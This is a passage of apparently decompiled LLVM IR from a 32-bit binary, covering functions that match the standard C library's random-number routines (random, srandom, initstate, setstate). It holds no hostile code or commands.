dec_label_pc_804ed70:                             ; preds = %dec_label_pc_804ed0f
  %v10_804ed70 = icmp eq i8 %v0_804ed0f, 2
  %v1_804ed72 = icmp eq i1 %v10_804ed70, false
  br i1 %v1_804ed72, label %dec_label_pc_804ed7c, label %dec_label_pc_804ed74

dec_label_pc_804ed74:                             ; preds = %dec_label_pc_804ed70
  store i8 3, i8* @global_var_8058b00.162, align 256
  br label %dec_label_pc_804ed7c

dec_label_pc_804ed7c:                             ; preds = %dec_label_pc_804ed70, %dec_label_pc_804ed74
  %v0_804ed7c = phi i8 [ %v0_804ed0f, %dec_label_pc_804ed70 ], [ 3, %dec_label_pc_804ed74 ]
  %v9_804ed7c = icmp eq i8 %v0_804ed7c, 3
  %v1_804ed83 = icmp eq i1 %v9_804ed7c, false
  br i1 %v1_804ed83, label %dec_label_pc_804ed96, label %dec_label_pc_804ed85

dec_label_pc_804ed85:                             ; preds = %dec_label_pc_804ed7c
  store i8 4, i8* @global_var_8058b00.162, align 256
  %v1_804ed91 = call i32 @function_804fab8(i32 127)
  unreachable

dec_label_pc_804ed96:                             ; preds = %dec_label_pc_804ed7c, %dec_label_pc_804ed96
  br label %dec_label_pc_804ed96

; uselistorder directives
  uselistorder i32 %v1_804ed4b, { 0, 3, 2, 1 }
  uselistorder i8 %v0_804ed0f, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804ecae, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 1, 6, 7, 8, 9, 10, 14, 11, 13, 12, 0 }
  uselistorder i8* @global_var_8058b00.162, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804ed96, { 1, 0 }
  uselistorder label %dec_label_pc_804ed7c, { 1, 0 }
  uselistorder label %dec_label_pc_804ed0f, { 1, 0 }
  uselistorder label %dec_label_pc_804ecd7, { 1, 0 }
}

define i32 @function_804ed9c(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ed9c:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804eda4 = load i32, i32* @ebx, align 4
  store i32 %v0_804eda4, i32* %stack_var_-4, align 4
  %v2_804edb2 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804edb2, i32* @ebx, align 4
  %v2_804edb7 = call i32 @function_804f65e(i32 %v2_804edb2, i32 134542939)
  %v1_804edc3 = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056360.163 to i32))
  %v2_804edca = ptrtoint i32* %stack_var_-8 to i32
  %v3_804edd4 = call i32 @function_804ef7d(i32* nonnull @global_var_8056378, i32 %v2_804edca)
  store i32 ptrtoint (i32* @global_var_8056378 to i32), i32* @eax, align 4
  store i32 %v2_804edca, i32* @edx, align 4
  %v2_804edde = call i32 @function_804f65e(i32 %v2_804edb2, i32 1)
  %v3_804ede3 = load i32, i32* %stack_var_-8, align 4
  %v2_804edea = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804edea, i32* @ebx, align 4
  ret i32 %v3_804ede3
}

define i32 @function_804edec(i32 %arg1) local_unnamed_addr {
dec_label_pc_804edec:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_804edfd = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804edfd, i32* @eax, align 4
  %v2_804ee02 = call i32 @function_804f65e(i32 %v2_804edfd, i32 134542939)
  %v1_804ee0e = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056360.163 to i32))
  %v0_804ee13 = load i32, i32* bitcast (i32** @global_var_8056380.166 to i32*), align 128
  store i32 %v0_804ee13, i32* @ebx, align 4
  %v3_804ee24 = call i32 @function_804eee4(i32 %arg1, i32* nonnull @global_var_8056378)
  %v2_804ee2c = icmp slt i32 %v3_804ee24, 0
  br i1 %v2_804ee2c, label %dec_label_pc_804ee33, label %dec_label_pc_804ee30

dec_label_pc_804ee30:                             ; preds = %dec_label_pc_804edec
  store i32 ptrtoint (i32** @global_var_805637c.167 to i32), i32* @esi, align 4
  br label %dec_label_pc_804ee33

dec_label_pc_804ee33:                             ; preds = %dec_label_pc_804edec, %dec_label_pc_804ee30
  store i32 %v2_804edfd, i32* @eax, align 4
  %v2_804ee3c = call i32 @function_804f65e(i32 %v2_804edfd, i32 1)
  %v0_804ee44 = load i32, i32* @esi, align 4
  ret i32 %v0_804ee44

; uselistorder directives
  uselistorder label %dec_label_pc_804ee33, { 1, 0 }
}

define i32 @function_804ee49(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804ee49:
  %stack_var_-24 = alloca i32, align 4
  %v2_804ee58 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804ee58, i32* @ebx, align 4
  %v2_804ee5d = call i32 @function_804f65e(i32 %v2_804ee58, i32 134542939)
  %v1_804ee69 = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056360.163 to i32))
  store i32 ptrtoint (i32** @global_var_805637c.167 to i32), i32* @esi, align 4
  %v4_804ee88 = inttoptr i32 %arg2 to i32*
  %v5_804ee88 = call i32 @function_804f075(i32 %arg1, i32* %v4_804ee88, i32 %arg3, i32 ptrtoint (i32* @global_var_8056378 to i32))
  store i32 %v5_804ee88, i32* @eax, align 4
  %v2_804ee93 = call i32 @function_804f65e(i32 %v2_804ee58, i32 1)
  %v0_804ee9b = load i32, i32* @esi, align 4
  ret i32 %v0_804ee9b
}

define i32 @function_804eea0(i32 %arg1) local_unnamed_addr {
dec_label_pc_804eea0:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804eea0 = load i32, i32* @ebx, align 4
  store i32 %v0_804eea0, i32* %stack_var_-4, align 4
  %v2_804eeae = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804eeae, i32* @ebx, align 4
  %v2_804eeb3 = call i32 @function_804f65e(i32 %v2_804eeae, i32 134542939)
  %v1_804eebf = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056360.163 to i32))
  %v3_804eecf = call i32 @function_804efdb(i32 %arg1, i32* nonnull @global_var_8056378)
  store i32 ptrtoint (i32* @global_var_8056378 to i32), i32* @eax, align 4
  %v2_804eed9 = call i32 @function_804f65e(i32 %v2_804eeae, i32 1)
  %v2_804eee1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804eee1, i32* @ebx, align 4
  ret i32 %v2_804eed9

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_8056378 to i32), { 1, 2, 0 }
  uselistorder i32* @global_var_8056378, { 0, 1, 3, 2 }
}

define i32 @function_804eee4(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_804eee4:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v0_804eee7 = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_804eef3 = add i32 %tmp3, 12
  %v2_804eef3 = inttoptr i32 %v1_804eef3 to i32*
  %v3_804eef3 = load i32, i32* %v2_804eef3, align 4
  store i32 %v3_804eef3, i32* %ecx.global-to-local, align 4
  %v1_804eef6 = add i32 %arg1, 4
  store i32 %v1_804eef6, i32* %esi.global-to-local, align 4
  %v1_804eef9 = add i32 %tmp3, 8
  %v2_804eef9 = inttoptr i32 %v1_804eef9 to i32*
  %v3_804eef9 = load i32, i32* %v2_804eef9, align 4
  %v1_804eefc = icmp eq i32 %v3_804eef3, 0
  %v1_804eefe = icmp eq i1 %v1_804eefc, false
  br i1 %v1_804eefe, label %dec_label_pc_804ef09, label %dec_label_pc_804ef00

dec_label_pc_804ef00:                             ; preds = %dec_label_pc_804eee4
  %v1_804ef00 = add i32 %v3_804eef9, -4
  %v2_804ef00 = inttoptr i32 %v1_804ef00 to i32*
  store i32 0, i32* %v2_804ef00, align 4
  br label %dec_label_pc_804ef19

dec_label_pc_804ef09:                             ; preds = %dec_label_pc_804eee4
  %v1_804ef09 = add i32 %tmp3, 4
  %v2_804ef09 = inttoptr i32 %v1_804ef09 to i32*
  %v3_804ef09 = load i32, i32* %v2_804ef09, align 4
  %v2_804ef0c = sub i32 %v3_804ef09, %v3_804eef9
  %v2_804ef0e = sdiv i32 %v2_804ef0c, 4
  %v3_804ef11 = mul i32 %v2_804ef0e, 5
  %v2_804ef14 = add i32 %v3_804ef11, %v3_804eef3
  store i32 %v2_804ef14, i32* %eax.global-to-local, align 4
  %v2_804ef16 = add i32 %v3_804eef9, -4
  %v3_804ef16 = inttoptr i32 %v2_804ef16 to i32*
  store i32 %v2_804ef14, i32* %v3_804ef16, align 4
  br label %dec_label_pc_804ef19

dec_label_pc_804ef19:                             ; preds = %dec_label_pc_804ef00, %dec_label_pc_804ef09
  %v0_804ef19 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ef19 = add i32 %v0_804ef19, -4
  %v2_804ef19 = inttoptr i32 %v1_804ef19 to i32*
  %v3_804ef19 = load i32, i32* %v2_804ef19, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_804ef21 = ashr i32 %v3_804ef19, 31
  %v2_804ef22 = zext i32 %v3_804ef19 to i64
  %v4_804ef22 = zext i32 %v1_804ef21 to i64
  %v5_804ef22 = mul nuw i64 %v4_804ef22, 4294967296
  %v6_804ef22 = or i64 %v5_804ef22, %v2_804ef22
  %v8_804ef22 = sdiv i64 %v6_804ef22, 5
  %v9_804ef22 = trunc i64 %v8_804ef22 to i32
  store i32 %v9_804ef22, i32* %eax.global-to-local, align 4
  %v10_804ef22 = srem i64 %v6_804ef22, 5
  %v11_804ef22 = trunc i64 %v10_804ef22 to i32
  %v6_804ef27 = icmp ugt i32 %v11_804ef22, 4
  br i1 %v6_804ef27, label %dec_label_pc_804ef67, label %dec_label_pc_804ef29

dec_label_pc_804ef29:                             ; preds = %dec_label_pc_804ef19
  %v1_804ef29 = mul i32 %v11_804ef22, 4
  %v2_804ef29 = add i32 %v1_804ef29, ptrtoint (i32* @global_var_80546b4.168 to i32)
  %v3_804ef29 = inttoptr i32 %v2_804ef29 to i32*
  %v4_804ef29 = load i32, i32* %v3_804ef29, align 4
  store i32 %v4_804ef29, i32* %ecx.global-to-local, align 4
  %v1_804ef30 = icmp eq i32 %v11_804ef22, 0
  %v2_804ef32 = add i32 %v1_804ef29, ptrtoint (i32* @global_var_80546a0.169 to i32)
  %v3_804ef32 = inttoptr i32 %v2_804ef32 to i32*
  %v4_804ef32 = load i32, i32* %v3_804ef32, align 4
  store i32 %v4_804ef32, i32* %ebp.global-to-local, align 4
  %v1_804ef39 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ef39 = add i32 %v1_804ef39, 12
  %v3_804ef39 = inttoptr i32 %v2_804ef39 to i32*
  store i32 %v11_804ef22, i32* %v3_804ef39, align 4
  %v0_804ef3c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ef3c = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ef3c = add i32 %v1_804ef3c, 16
  %v3_804ef3c = inttoptr i32 %v2_804ef3c to i32*
  store i32 %v0_804ef3c, i32* %v3_804ef3c, align 4
  %v0_804ef3f = load i32, i32* %ebp.global-to-local, align 4
  %v1_804ef3f = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ef3f = add i32 %v1_804ef3f, 20
  %v3_804ef3f = inttoptr i32 %v2_804ef3f to i32*
  store i32 %v0_804ef3f, i32* %v3_804ef3f, align 4
  br i1 %v1_804ef30, label %dec_label_pc_804ef5a, label %dec_label_pc_804ef44

dec_label_pc_804ef44:                             ; preds = %dec_label_pc_804ef29
  %v0_804ef44 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ef44 = add i32 %v0_804ef44, -4
  %v2_804ef44 = inttoptr i32 %v1_804ef44 to i32*
  %v3_804ef44 = load i32, i32* %v2_804ef44, align 4
  %v1_804ef47 = ashr i32 %v3_804ef44, 31
  %v0_804ef48 = load i32, i32* %edi.global-to-local, align 4
  %v2_804ef48 = zext i32 %v3_804ef44 to i64
  %v4_804ef48 = zext i32 %v1_804ef47 to i64
  %v5_804ef48 = mul nuw i64 %v4_804ef48, 4294967296
  %v6_804ef48 = or i64 %v5_804ef48, %v2_804ef48
  %v7_804ef48 = zext i32 %v0_804ef48 to i64
  %v8_804ef48 = sdiv i64 %v6_804ef48, %v7_804ef48
  %v9_804ef48 = trunc i64 %v8_804ef48 to i32
  %v2_804ef4a = mul i32 %v9_804ef48, 4
  %v3_804ef4a = add i32 %v2_804ef4a, %v0_804ef44
  %v1_804ef4d = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ef4d = add i32 %v1_804ef4d, %v9_804ef48
  store i32 %v2_804ef4d, i32* %eax.global-to-local, align 4
  %v1_804ef4f = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ef4f = add i32 %v1_804ef4f, 4
  %v3_804ef4f = inttoptr i32 %v2_804ef4f to i32*
  store i32 %v3_804ef4a, i32* %v3_804ef4f, align 4
  %v0_804ef52 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ef52 = ashr i32 %v0_804ef52, 31
  %v0_804ef53 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ef53 = zext i32 %v0_804ef52 to i64
  %v4_804ef53 = zext i32 %v1_804ef52 to i64
  %v5_804ef53 = mul nuw i64 %v4_804ef53, 4294967296
  %v6_804ef53 = or i64 %v5_804ef53, %v2_804ef53
  %v7_804ef53 = zext i32 %v0_804ef53 to i64
  %v8_804ef53 = sdiv i64 %v6_804ef53, %v7_804ef53
  %v9_804ef53 = trunc i64 %v8_804ef53 to i32
  store i32 %v9_804ef53, i32* %eax.global-to-local, align 4
  %v10_804ef53 = srem i64 %v6_804ef53, %v7_804ef53
  %v11_804ef53 = trunc i64 %v10_804ef53 to i32
  %v0_804ef55 = load i32, i32* %esi.global-to-local, align 4
  %v2_804ef55 = mul i32 %v11_804ef53, 4
  %v3_804ef55 = add i32 %v2_804ef55, %v0_804ef55
  %v1_804ef58 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ef58 = inttoptr i32 %v1_804ef58 to i32*
  store i32 %v3_804ef55, i32* %v2_804ef58, align 4
  br label %dec_label_pc_804ef5a

dec_label_pc_804ef5a:                             ; preds = %dec_label_pc_804ef29, %dec_label_pc_804ef44
  %v0_804ef5a = load i32, i32* %esi.global-to-local, align 4
  %v1_804ef5a = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ef5a = mul i32 %v1_804ef5a, 4
  %v3_804ef5a = add i32 %v2_804ef5a, %v0_804ef5a
  %v1_804ef5d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ef5d = add i32 %v1_804ef5d, 24
  %v3_804ef5d = inttoptr i32 %v2_804ef5d to i32*
  store i32 %v3_804ef5a, i32* %v3_804ef5d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804ef62 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ef62 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ef62 = add i32 %v1_804ef62, 8
  %v3_804ef62 = inttoptr i32 %v2_804ef62 to i32*
  store i32 %v0_804ef62, i32* %v3_804ef62, align 4
  %v0_804ef7c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ef75

dec_label_pc_804ef67:                             ; preds = %dec_label_pc_804ef19
  %v1_804ef67 = call i32 @function_804baa4(i32 %v0_804eee7)
  %v1_804ef6c = inttoptr i32 %v1_804ef67 to i32*
  store i32 22, i32* %v1_804ef6c, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ef75

dec_label_pc_804ef75:                             ; preds = %dec_label_pc_804ef5a, %dec_label_pc_804ef67
  %v0_804ef7c = phi i32 [ %v0_804ef7c.pre, %dec_label_pc_804ef5a ], [ -1, %dec_label_pc_804ef67 ]
  store i32 %v0_804eee7, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804ef7c

; uselistorder directives
  uselistorder i32 %v11_804ef22, { 1, 3, 2, 0 }
  uselistorder i32 %tmp3, { 0, 1, 3, 2 }
  uselistorder i64 5, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ef75, { 1, 0 }
  uselistorder label %dec_label_pc_804ef5a, { 1, 0 }
  uselistorder label %dec_label_pc_804ef19, { 1, 0 }
}

define i32 @function_804ef7d(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804ef7d:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804ef80 = load i32, i32* @ebx, align 4
  store i32 %v0_804ef80, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_804ef89 = add i32 %tmp3, 12
  %v2_804ef89 = inttoptr i32 %v1_804ef89 to i32*
  %v3_804ef89 = load i32, i32* %v2_804ef89, align 4
  %v4_804ef89 = icmp eq i32 %v3_804ef89, 0
  %v1_804ef8d = add i32 %tmp3, 8
  %v2_804ef8d = inttoptr i32 %v1_804ef8d to i32*
  %v3_804ef8d = load i32, i32* %v2_804ef8d, align 4
  store i32 %v3_804ef8d, i32* %esi.global-to-local, align 4
  %v1_804ef90 = icmp eq i1 %v4_804ef89, false
  br i1 %v1_804ef90, label %dec_label_pc_804efa9, label %dec_label_pc_804ef92

dec_label_pc_804ef92:                             ; preds = %dec_label_pc_804ef7d
  %v2_804ef92 = inttoptr i32 %v3_804ef8d to i32*
  %v3_804ef92 = load i32, i32* %v2_804ef92, align 4
  %v5_804ef92 = mul i32 %v3_804ef92, 1103515245
  %v1_804ef98 = add i32 %v5_804ef92, 12345
  %v1_804ef9d = urem i32 %v1_804ef98, -2147483648
  store i32 %v1_804ef9d, i32* %eax.global-to-local, align 4
  store i32 %v1_804ef9d, i32* %v2_804ef92, align 4
  %v0_804efa4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804efa4 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804efa4 = inttoptr i32 %v1_804efa4 to i32*
  store i32 %v0_804efa4, i32* %v2_804efa4, align 4
  br label %dec_label_pc_804efd4

dec_label_pc_804efa9:                             ; preds = %dec_label_pc_804ef7d
  %v1_804efa9 = add i32 %tmp3, 4
  %v2_804efa9 = inttoptr i32 %v1_804efa9 to i32*
  %v3_804efa9 = load i32, i32* %v2_804efa9, align 4
  store i32 %v3_804efa9, i32* %ecx.global-to-local, align 4
  %v2_804efac = load i32, i32* %arg1, align 4
  store i32 %v2_804efac, i32* %edx.global-to-local, align 4
  %v1_804efae = add i32 %tmp3, 24
  %v2_804efae = inttoptr i32 %v1_804efae to i32*
  %v3_804efae = load i32, i32* %v2_804efae, align 4
  store i32 %v3_804efae, i32* %edi.global-to-local, align 4
  %v1_804efb1 = inttoptr i32 %v3_804efa9 to i32*
  %v2_804efb1 = load i32, i32* %v1_804efb1, align 4
  store i32 %v2_804efb1, i32* %eax.global-to-local, align 4
  %v1_804efb3 = inttoptr i32 %v2_804efac to i32*
  %v2_804efb3 = load i32, i32* %v1_804efb3, align 4
  %v4_804efb3 = add i32 %v2_804efb3, %v2_804efb1
  store i32 %v4_804efb3, i32* %v1_804efb3, align 4
  %v0_804efb5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804efb5 = inttoptr i32 %v0_804efb5 to i32*
  %v2_804efb5 = load i32, i32* %v1_804efb5, align 4
  %v1_804efb7 = add i32 %v0_804efb5, 4
  store i32 %v1_804efb7, i32* %edx.global-to-local, align 4
  %v2_804efba = udiv i32 %v2_804efb5, 2
  %v1_804efbc = load i32, i32* %edi.global-to-local, align 4
  %v7_804efbc = icmp ult i32 %v1_804efb7, %v1_804efbc
  %v1_804efbe = load i32, i32* %ebp.global-to-local, align 4
  %v2_804efbe = inttoptr i32 %v1_804efbe to i32*
  store i32 %v2_804efba, i32* %v2_804efbe, align 4
  %v0_804efc1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804efc1 = add i32 %v0_804efc1, 4
  store i32 %v1_804efc1, i32* %eax.global-to-local, align 4
  br i1 %v7_804efbc, label %dec_label_pc_804efca, label %dec_label_pc_804efc6

dec_label_pc_804efc6:                             ; preds = %dec_label_pc_804efa9
  %v0_804efc6 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804efc6, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804efcf

dec_label_pc_804efca:                             ; preds = %dec_label_pc_804efa9
  %v1_804efca = load i32, i32* %edi.global-to-local, align 4
  %v7_804efca = icmp ult i32 %v1_804efc1, %v1_804efca
  %v1_804efcc = icmp eq i1 %v7_804efca, false
  %v3_804efcc = load i32, i32* %esi.global-to-local, align 4
  %v4_804efcc = select i1 %v1_804efcc, i32 %v3_804efcc, i32 %v1_804efc1
  store i32 %v4_804efcc, i32* %eax.global-to-local, align 4
  %v0_804efcf.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804efcf

dec_label_pc_804efcf:                             ; preds = %dec_label_pc_804efc6, %dec_label_pc_804efca
  %v0_804efcf = phi i32 [ %v0_804efc6, %dec_label_pc_804efc6 ], [ %v0_804efcf.pre, %dec_label_pc_804efca ]
  %v1_804efcf = load i32, i32* %ebx.global-to-local, align 4
  %v2_804efcf = inttoptr i32 %v1_804efcf to i32*
  store i32 %v0_804efcf, i32* %v2_804efcf, align 4
  %v0_804efd1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804efd1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804efd1 = add i32 %v1_804efd1, 4
  %v3_804efd1 = inttoptr i32 %v2_804efd1 to i32*
  store i32 %v0_804efd1, i32* %v3_804efd1, align 4
  br label %dec_label_pc_804efd4

dec_label_pc_804efd4:                             ; preds = %dec_label_pc_804ef92, %dec_label_pc_804efcf
  %v2_804efd4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804efd4, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804ef9d, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804efd4, { 1, 0 }
  uselistorder label %dec_label_pc_804efcf, { 1, 0 }
}

define i32 @function_804efdb(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_804efdb:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_804efdb = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_804efdf = load i32, i32* @edi, align 4
  %v0_804efe0 = load i32, i32* @esi, align 4
  %v0_804efe1 = load i32, i32* @ebx, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_804efed = add i32 %tmp14, 12
  %v2_804efed = inttoptr i32 %v1_804efed to i32*
  %v3_804efed = load i32, i32* %v2_804efed, align 4
  store i32 %v3_804efed, i32* %ecx.global-to-local, align 4
  %v6_804eff3 = icmp ugt i32 %v3_804efed, 4
  br i1 %v6_804eff3, label %dec_label_pc_804f06d, label %dec_label_pc_804eff5

dec_label_pc_804eff5:                             ; preds = %dec_label_pc_804efdb
  %v1_804eff5 = add i32 %tmp14, 8
  %v2_804eff5 = inttoptr i32 %v1_804eff5 to i32*
  %v3_804eff5 = load i32, i32* %v2_804eff5, align 4
  store i32 %v3_804eff5, i32* %ebx.global-to-local, align 4
  %v1_804eff8 = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_804efff = select i1 %v1_804eff8, i32 1, i32 %arg1
  store i32 %v3_804efff, i32* %edx.global-to-local, align 4
  %v1_804f002 = icmp eq i32 %v3_804efed, 0
  %v2_804f004 = inttoptr i32 %v3_804eff5 to i32*
  store i32 %v3_804efff, i32* %v2_804f004, align 4
  br i1 %v1_804f002, label %dec_label_pc_804f06b, label %dec_label_pc_804f008

dec_label_pc_804f008:                             ; preds = %dec_label_pc_804eff5
  %v0_804f008 = load i32, i32* @esi, align 4
  %v1_804f008 = add i32 %v0_804f008, 16
  %v2_804f008 = inttoptr i32 %v1_804f008 to i32*
  %v3_804f008 = load i32, i32* %v2_804f008, align 4
  store i32 %v3_804f008, i32* %eax.global-to-local, align 4
  %v0_804f00b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804f00b, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_804f012 = sext i32 %v3_804f008 to i64
  store i64 %v4_804f012, i64* %stack_var_-40, align 8
  %v5_804f04829 = icmp sgt i32 %v3_804f008, 1
  br i1 %v5_804f04829, label %dec_label_pc_804f017, label %dec_label_pc_804f04a

dec_label_pc_804f017:                             ; preds = %dec_label_pc_804f008, %dec_label_pc_804f017.dec_label_pc_804f017_crit_edge
  %v0_804f03f = phi i32 [ %v0_804f03f.pre, %dec_label_pc_804f017.dec_label_pc_804f017_crit_edge ], [ %v0_804f00b, %dec_label_pc_804f008 ]
  %v0_804f017 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f01e = ashr i32 %v0_804f017, 31
  %v2_804f01f = zext i32 %v0_804f017 to i64
  %v4_804f01f = zext i32 %v1_804f01e to i64
  %v5_804f01f = mul nuw i64 %v4_804f01f, 4294967296
  %v6_804f01f = or i64 %v5_804f01f, %v2_804f01f
  %v8_804f01f = sdiv i64 %v6_804f01f, 127773
  %v9_804f01f = trunc i64 %v8_804f01f to i32
  %v10_804f01f = srem i64 %v6_804f01f, 127773
  %v3_804f025 = mul nsw i64 %v10_804f01f, 16807
  %v4_804f025 = trunc i64 %v3_804f025 to i32
  %tmp24 = mul i32 %v9_804f01f, -2836
  %v2_804f031 = add i32 %v4_804f025, %tmp24
  %v1_804f033 = add i32 %v2_804f031, 1
  %v6_804f033 = xor i32 %v2_804f031, -2147483648
  %v7_804f033 = xor i32 %v1_804f033, %v2_804f031
  %v8_804f033 = and i32 %v7_804f033, %v6_804f033
  %v9_804f033 = icmp slt i32 %v8_804f033, 0
  %v10_804f033 = icmp eq i32 %v1_804f033, 0
  %v11_804f033 = icmp slt i32 %v1_804f033, 0
  %v1_804f036 = add i32 %v2_804f031, 2147483647
  store i32 %v1_804f036, i32* %eax.global-to-local, align 4
  %v3_804f03c = icmp ne i1 %v11_804f033, %v9_804f033
  %v4_804f03c = or i1 %v10_804f033, %v3_804f03c
  %v7_804f03c = select i1 %v4_804f03c, i32 %v1_804f036, i32 %v2_804f031
  store i32 %v7_804f03c, i32* %edx.global-to-local, align 4
  %v1_804f03f = add i32 %v0_804f03f, 4
  store i32 %v1_804f03f, i32* %ecx.global-to-local, align 4
  %v2_804f042 = inttoptr i32 %v1_804f03f to i32*
  store i32 %v7_804f03c, i32* %v2_804f042, align 4
  %v0_804f044 = load i32, i32* @edi, align 4
  %v1_804f044 = add i32 %v0_804f044, 1
  store i32 %v1_804f044, i32* @edi, align 4
  %v3_804f045.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t11 = trunc i64 %v3_804f045.pre to i32
  %v5_804f048 = icmp slt i32 %v1_804f044, %extract.t11
  br i1 %v5_804f048, label %dec_label_pc_804f017.dec_label_pc_804f017_crit_edge, label %dec_label_pc_804f045.dec_label_pc_804f04a_crit_edge

dec_label_pc_804f017.dec_label_pc_804f017_crit_edge: ; preds = %dec_label_pc_804f017
  %v0_804f03f.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f017

dec_label_pc_804f045.dec_label_pc_804f04a_crit_edge: ; preds = %dec_label_pc_804f017
  %v0_804f04a.pre = load i32, i32* @esi, align 4
  %v0_804f04d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f04a

dec_label_pc_804f04a:                             ; preds = %dec_label_pc_804f045.dec_label_pc_804f04a_crit_edge, %dec_label_pc_804f008
  %v0_804f04d = phi i32 [ %v0_804f04d.pre, %dec_label_pc_804f045.dec_label_pc_804f04a_crit_edge ], [ %v0_804f00b, %dec_label_pc_804f008 ]
  %v0_804f04a = phi i32 [ %v0_804f04a.pre, %dec_label_pc_804f045.dec_label_pc_804f04a_crit_edge ], [ %v0_804f008, %dec_label_pc_804f008 ]
  %v1_804f04a = add i32 %v0_804f04a, 20
  %v2_804f04a = inttoptr i32 %v1_804f04a to i32*
  %v3_804f04a = load i32, i32* %v2_804f04a, align 4
  store i32 %v3_804f04a, i32* %eax.global-to-local, align 4
  %v2_804f04d = add i32 %v0_804f04a, 4
  %v3_804f04d = inttoptr i32 %v2_804f04d to i32*
  store i32 %v0_804f04d, i32* %v3_804f04d, align 4
  %v0_804f050 = load i32, i32* %ebx.global-to-local, align 4
